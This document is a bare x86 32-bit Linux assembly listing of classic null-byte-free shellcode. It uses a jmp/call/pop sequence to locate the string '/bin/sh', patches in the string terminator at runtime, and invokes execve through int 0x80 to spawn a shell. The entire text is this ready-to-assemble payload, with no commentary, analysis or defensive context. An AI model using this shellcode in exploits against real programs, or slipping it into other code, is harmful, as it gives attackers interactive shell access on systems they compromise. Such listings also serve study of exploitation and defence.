.text
.globl _start
_start:
	xorl %eax, %eax
	cdq
	movb $11, %al
	jmp binsh
	back:
	movl %edx, %ecx
	movl (%esp), %ebx
	movb %dl, 0x7(%ebx)
	int $0x80
binsh:
	call back
	.ascii "/bin/sh"


